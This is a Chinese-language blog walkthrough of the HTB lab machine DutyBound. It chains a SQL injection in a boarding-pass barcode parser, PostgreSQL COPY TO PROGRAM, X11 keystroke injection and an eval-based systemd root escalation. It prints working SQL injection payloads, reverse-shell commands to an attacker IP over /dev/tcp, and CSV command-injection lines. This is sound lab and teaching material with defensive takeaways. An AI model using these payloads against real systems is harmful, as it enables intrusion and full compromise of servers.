---
title: "HTB DutyBound：BCBP 航班条码 SQL 注入、X11 横移与 systemd eval 提权"
date: 2026-11-13
categories: ["网络攻防"]
tags: ["HTB", "靶场", "Linux提权", "SQL注入", "PostgreSQL", "X11"]
description: "HTB DutyBound（Linux）实战：登机牌条码 SQL 注入拿到 postgres shell，X11 横移到 kiosk 用户，最后借 systemd 服务提权"
draft: false
password: true
---

DutyBound 是一台机场免税店主题的 Linux 机器：前台是 AirSnacks 自助收银，登机牌条码用来判断能不能免税；背后是 PostgreSQL、一个跑在 X11 上的 kiosk 桌面，以及一套用 `eval` 解析 CSV 的 root 服务。三块看起来无关的组件，刚好能串成一条链。

| 项目 | 内容 |
| --- | --- |
| 目标 | 10.129.206.84（DutyBound） |
| 系统 | Linux / Medium |
| 入口 | `/checkout/boarding-pass/verify` 的 BCBP 解析 |
| 关键点 | SQL 拼接、`pg_execute_server_program`、X11 XTEST、systemd path + `eval` |

## 0. 侦察

全端口只有 22 / 80 / 443，80 直接 301 到 `https://airsnacks.htb/`：

```bash
nmap -Pn -p- --min-rate 3000 -T4 10.129.206.84
echo '10.129.206.84 airsnacks.htb' >> /etc/hosts
```

页面是「AirSnacks Self-Checkout」自助收银。`/static/app.js` 里能看到真正的接口：

```javascript
postJSON("/checkout/boarding-pass/verify", { raw: "" });
```

先往购物车里加一件商品，否则 checkout 会 302：

```bash
curl -sk -b jar -c jar -H 'Content-Type: application/json' \
  -d '{"sku":"SNK-CRN"}' https://airsnacks.htb/cart/add
```

空 payload 打验证接口，报错就是解析器的入口：

```json
{"detail":"expected 'M' at offset 0","error":"BCBP_ERR_FORMAT_CODE","item":1}
```

## 1. 把 BCBP 拼对

BCBP（IATA Resolution 792 的条形码登机牌）是定长结构。服务端的报错逐个字段地告诉我们格式要求，按错误修就行：

| 报错 | 含义 |
| --- | --- |
| `BCBP_ERR_FLIGHT_NUMBER` | 航班号是「4 位数字 + 1 位字母/空格」 |
| `BCBP_ERR_VERSION_MARKER` | 条件区必须以 `>` 开头 |
| `BCBP_ERR_VERSION_UNSUPPORTED` | 版本号只支持 5–8 |
| `BCBP_ERR_ITEM10_MISMATCH` | 第 10 项只能是 `0B/18/25/32` |
| `BCBP_ERR_DOC_TYPE` | 证件类型是 `B` 或空格 |
| `BCBP_ERR_ISSUE_DATE` | 签发日期是「4 位年份 + 3 位儒略日」 |
| `BCBP_ERR_ISSUER_NOT_INTERLINE` | 出票航司必须是本航司或联营伙伴 |

最终能验证通过的 payload（固定段 58 字符 + 2 位十六进制长度 + 条件区）：

```text
M1DESMARAIS/LUC       EABC123 YULFRAAC 0834 326J001A0025 1
+ 11
+ >60B2026123BAC 03
```

拆开看：

```text
M1                     格式码 + 航段数
DESMARAIS/LUC          旅客姓名（20 字符，SURNAME/GIVEN）
E                      电子票标志
ABC123                 订座编号（7）
YUL / FRA              出发 / 到达
AC                     承运人
0834                   航班号
326                    儒略日
J                      舱位
001A                   座位
0025                   序号
' 1'                   状态 + 条件区长度起始
```

条件区 `>60B2026123BAC 03`：

```text
>6          版本 6
0B          第 10 项（0B/18/25/32 之一）
2026123     签发日期：2026 年 + 第 123 天
B           证件类型
AC          出票航司（要和固定段承运人一致）
03          第 17 项（03/0D/0E/0F/12/15/25/26/29/2A 之一）
```

验证成功返回 `audit_ref` / `dest` / `eligibility_token`，说明整条审计落库路径都被打通了。

## 2. SQL 注入

审计日志把登机牌字段拼进 `INSERT INTO bp_scan_audit`，而且是 Python `%` 拼接。把姓名换成带单引号的值，错误里直接漏出完整语句：

```text
{"detail":"syntax error at or near \"RAIS\"\nLINE 1: ...0b4bd37f', 'dutyfree-kiosk7', now(), 'ABC123', 'A'B/CDE', 'A...\n"}
```

姓名校验只允许 `A-Z`、空格、`/`、`-` 和单引号（真实姓名里的 O'Brien 场景），所以可以把字符串截断，但**分号会被姓名校验拦掉**。真正能塞分号的是条件区尾部——审计语句里 `airline_use` 那一列：

```text
... 'YUL', 'FRA', '', '', 85, '4TEST')
```

最后这个字符串列就是条件区尾部，前三字符被解析器吃掉，其余原样拼接。于是时间盲注成立：

```text
tail = AAA');SELECT pg_sleep(5);--
```

响应耗时 6.1 秒，确认堆叠查询可用。

## 3. COPY TO PROGRAM 拿 shell

错误里能看到数据库用户是 `airsnacks_app`。用 `pg_has_role` 做一次除零判断，确认它属于 `pg_execute_server_program`：

```sql
');SELECT CASE WHEN pg_has_role(current_user,'pg_execute_server_program','member')
THEN 1/0 ELSE NULL END;--
```

有这条权限就可以 `COPY ... TO PROGRAM` 直接执行命令：

```sql
');COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.16.245/4444 0>&1"';--
```

在攻击机上按需起一个命令队列式的 shell handler（把 socket 和命令队列文件接起来，命令一行一行发、输出落日志），拿到 `postgres@dutyfree-kiosk7`。

## 4. X11 横移到 kiosk 用户

`postgres` 能访问 `:0`：kiosk 用户正开着 Openbox + Firefox kiosk，X socket 对本地用户没做隔离。

```bash
ls -la /tmp/.X11-unix/          # srwxrwxrwx
python3 -c "import Xlib; print('xlib ok')"
```

Openbox 的快捷键里有 `C-A-t` → `xterm`。用 python-xlib 的 XTEST 合成按键：

```python
from Xlib import X, XK, display
from Xlib.ext import xtest
d = display.Display(":0")
kc = lambda s: d.keysym_to_keycode(XK.string_to_keysym(s))
for s in ("Control_L", "Alt_L", "t"):
    xtest.fake_input(d, X.KeyPress, kc(s))
for s in ("t", "Alt_L", "Control_L"):
    xtest.fake_input(d, X.KeyRelease, kc(s))
d.sync()
```

会弹出一个 `dutyfree-kiosk` 的 xterm。注意 Openbox 会把窗口 reparent 到 frame，直接列 root 的子窗口看不到它，要递归找 `WM_CLASS = ('xterm','XTerm')` 的窗口，`set_input_focus` 之后再逐字符合成键盘事件（`/`、`>`、`"` 这些要带 Shift），把命令敲进去：

![1](../../dutybound/01-x11-kiosk.png)

```bash
bash -c "bash -i >& /dev/tcp/10.10.16.245/4445 0>&1"
```

拿到 `dutyfree-kiosk` 的 shell，`id` 显示它在 `pos-ops` 组里，`user.txt` 就在家目录。

## 5. root：可写的 CSV + systemd path + eval

`dutyfree-kiosk` 属于 `pos-ops`，而 `/opt/vrs/data/duty-rates.csv` 是 `root:pos-ops` 组可写：

```text
SPIRITS,45,20
WINE,25,20
BEER,25,20
...
```

有 `vrs-duty-apply.path` 监听这个文件，改动就触发 `vrs-duty-apply.service`（root 身份）执行：

```bash
eval "${tax_class}=${duty_pct}"
```

脚本只校验后两列是数字，第一列 `tax_class` 直接进了 `eval`。由于脚本是 `set -euo pipefail`，第一列要写成「先执行命令、再赋值」的形式，且不能有会失败的命令：

```text
id > /tmp/root_poc 2>&1;b,45,20
SPIRITS,45,20
...
```

写回 CSV，path 单元立刻触发，最后一条列照样保留（否则脚本里 required category 检查会提前退出）：

```bash
printf 'id > /tmp/root_poc 2>&1;b,45,20\nSPIRITS,45,20\n...' \
  > /opt/vrs/data/duty-rates.csv
sleep 3; cat /tmp/root_poc
# uid=0(root) gid=0(root) groups=0(root)
```

同样的方式复制 flag：

```text
cp /root/root.txt /tmp/rootflag;chmod 644 /tmp/rootflag;b,45,20
```

最后把备份的 CSV 还原回去，服务恢复正常。

## 6. 收尾：这台机器考什么

![2](../../dutybound/02-solved.png)

- **结构化输入不等于安全输入**：BCBP 的必填字段校验做得不错，但尾部「航司自定义数据」没有同等对待；
- **数据库权限决定注入的影响面**：应用角色只有 SELECT/INSERT，却额外挂了 `pg_execute_server_program`，注入直接升级成 OS 命令执行；
- **X11 是安全边界**：一个数据库进程能连上别人的活动桌面，等于能敲别人的键盘；
- **root 服务信任低权限文件**：组可写的 CSV + path 触发的 root 服务 + `eval`，是典型的「数据被当成代码执行」。

## 附录：踩过的坑

**坑 0 · 条件区的字段顺序不是格式号顺序。** 签发日期（第 22 项）排在证件类型（第 16 项）前面、第 17 项又在最后；只能靠报错一个字段一个字段地试出来，别硬套 IATA 文档。

**坑 1 · 姓名和条件区的注入能力不同。** 姓名允许单引号但不允许分号（校验报 `expected SURNAME/GIVEN, A-Z only`），所以堆叠查询必须走条件区尾部，而不是姓名。

**坑 2 · 反向 shell 的存活跟 HTTP 请求绑定。** `COPY TO PROGRAM` 的 shell 是挂在当前 SQL 会话上的，注入用的 HTTP 请求一断，bash 就跟着死。注入请求必须一直挂着。

**坑 3 · Openbox 会 reparent 窗口。** `query_tree().children` 只能看到 frame，找不到 xterm；要递归找客户端窗口，再 `set_input_focus`。

**坑 4 · 输入法会吃掉 SendKeys。** 用键盘自动化往浏览器里填 flag 时，中文输入法把 32 位 hex 变成了乱码；改成写剪贴板再 `Ctrl+V` 才稳定。
